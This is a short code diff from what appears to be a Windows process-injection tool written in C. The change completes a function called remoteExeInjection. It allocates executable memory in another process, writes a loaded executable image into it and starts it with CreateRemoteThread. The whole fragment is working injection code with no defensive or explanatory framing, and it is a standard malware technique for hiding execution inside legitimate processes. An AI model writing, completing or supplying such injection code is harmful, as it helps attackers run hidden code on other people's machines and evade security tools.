@@ -25,15 +25,29 @@ void remoteExeInjection(){
         exit(EXIT_FAILURE);
     }
 
-    loadPeToProcess((struct Executable *) &overlay);
-    puts("Injection successfull.");
-    exit(25);
+    LPVOID loadedPeBaseAddress = loadPeToProcess((struct Executable *) &overlay);
+    /*puts("Injection successfull.");
+    exit(25);*/
 
-    /*HANDLE hNewThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteProcessAddress, NULL, 0, NULL);
+
+    int peFileVirtualSize = getSizeOfPeFile_Virtual((struct Executable *) &overlay);
+    int *allocAddress;
+    allocAddress = VirtualAllocEx(hProcess, NULL, peFileVirtualSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if(allocAddress == NULL){
+        perror("Injection failed. Could not allocate memory in remote process.\n");
+        exit(EXIT_FAILURE);
+    }
+
+    if (WriteProcessMemory(hProcess, allocAddress, loadedPeBaseAddress, peFileVirtualSize, NULL) == 0){
+        perror("Injection failed. Could not write to remote process.\n");
+        exit(EXIT_FAILURE);
+    }
+
+    HANDLE hNewThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)getExecutableEntryPoint((struct Executable *) &overlay), NULL, 0, NULL);
     if(hNewThread == NULL){
         perror("Injection failed. Could not create remote thread.\n");
         exit(EXIT_FAILURE);
-    }*/
+    }
 
 }
 
